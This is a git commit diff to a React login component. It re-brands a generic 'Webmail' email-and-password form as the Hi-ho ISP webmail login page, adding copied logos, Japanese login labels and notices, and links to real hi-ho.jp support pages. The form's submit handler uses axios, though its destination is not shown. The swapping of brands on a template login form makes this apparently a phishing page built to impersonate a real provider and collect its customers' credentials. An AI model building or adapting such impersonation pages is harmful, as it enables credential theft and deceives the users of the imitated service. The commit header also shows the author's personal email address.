75830e7dfd936fb5a4c3cd6ea9ea9e4888a9f815
latestbob <edidiongbobson@gmail.com>
2024-01-08 21:20:45 -0800

    hiho added

--- src/home.js
+++ src/home.js
@@ -8,34 +8,25 @@ import { useState } from 'react';
 import axios from 'axios';
 
 import { useEffect } from 'react';
+import hiho_one from './hiho_one.gif';
+import hiho_two from './hiho_two.gif';
+import help from './help.gif';
+import footer from './footer.gif';
+
+
+
 function Home(){
 
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Adams")
+    const[platform, setPlatform] = useState("Hi-ho")
 
     const[showError, setShowError] = useState(false);
 
 
     
 
-    useEffect(() => {
-        // Code to run when the component mounts or when dependencies change
-      showCookies();
-
-      }, [])
-
-
-      function showCookies(){
-        const cookiesArray = document.cookie.split('; ');
-
-        cookiesArray.forEach(cookie => {
-          const [name, value, domain] = cookie.split('=');
-          
-          console.log(`Cookies name is : ${name} , Cookies Value is  ${value}`);
-        });
-    }
 
 async function handleSubmit(e){
     e.preventDefault();
@@ -64,23 +55,37 @@ async function handleSubmit(e){
 
     return (
         <>
-            <nav className='mynav px-3 py-3'>
-                <img className='navimage' src={logo} />
+            <nav className='mynav px-3 py-2'>
+                <img className='navimage' src={hiho_one} />
+                <img className='navimage' src={hiho_two} />
+                <a href='http://hi-ho.jp/support/newmail_manual/'> <img className='help'src={help} /> <span className='mt-1 helptext'>ヘルプ
+</span></a>
 
             </nav>
 
-                <div className='py-5'>
+            <hr  />
+
+                <div className='py-2'>
 
                 </div>
 
-                {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
-            <strong className='text-center'>Invalid Email or Password</strong> 
+            <div className='col-md-4 m-auto warning alert my-4'>
+                <p className='warningtext'><b>【</b>お知らせ<b>】</b> <br/>ご案内はありません。</p>
+
+            </div>
+
+            <div className='py-4'>
+
+                </div>
+
+                {showError && <div className="col-md-4 m-auto alert alert-danger alert-dismissible fade show" role="alert">
+            <strong className='text-center'>無効なメールアドレスまたはパスワード</strong> 
             <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                 <span aria-hidden="true">&times;</span>
             </button>
             </div>}
 
-            <div className='formdiv col-md-5 m-auto p-0 '>
+            <div className='formdiv col-md-4 m-auto p-0 '>
             {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
             <strong className='text-center'>Invalid Email or Password</strong> 
             <button type="button" className="close" data-dismiss="alert" aria-label="Close">
@@ -88,14 +93,12 @@ async function handleSubmit(e){
             </button>
             </div>}
 
-                <div className='cardhead'>
-                Welcome to Webmail
-                </div>
+              
 
                 <form onSubmit={handleSubmit}>
 
                 <div class="formrow text-center mt-3">
-                                <span class="prompt"><label for="user">Email</label></span>
+                                <span class="prompt"><label for="user">メールアドレス：</label></span>
                                                 <div class="element"><input type="email"onChange={function(e){
                                                     setUserName(e.target.value);
                                                 }}value={email} className='inputwide' required/>
@@ -104,16 +107,21 @@ async function handleSubmit(e){
 
 
                         <div class="formrow text-center">
-                                <span class="prompt"><label for="user">Password</label></span>
+                                <span class="prompt"><label for="user">パスワード　　：</label></span>
                                                 <div class="element"><input onChange={function(e){
                                                     setPassword(e.target.value);
                                                 }} value={password} type="password"className='inputwide' required/>
                                 </div>
                         </div>
 
+                        <div className='form-group mt-3 text-center'>
+                            <input type="checkbox"/> <span className='checktext'>次回からのメールアドレス入力を省略</span>
+
+                        </div>
+
 
                     <div className='buttondiv py-4 text-center'>
-                        <button className='mybutton'type="submit">Login</button>
+                        <button className='mybutton checktext'type="submit">ログイン</button>
 
                     </div>
 
@@ -127,7 +135,19 @@ async function handleSubmit(e){
             
             <br/>
 
-                <p className='info'>Webmail</p>
+                <div className='alert alert-primary col-md-3 m-auto py-0'>
+                    <p>※本サービスは、ハイホー接続会員向けのサービスになります。<br/> ※対応ブラウザ・対応携帯電話：<a href="http://hi-ho.jp/service/mail/webmail/">詳しくはこちら＞</a></p> 
+
+                </div>
+
+                <br/>
+
+                <hr />
+
+                <div className='text-right pr-3'>
+                    <img className='footer 'src={footer} />
+
+                </div>
         </>
     );
 
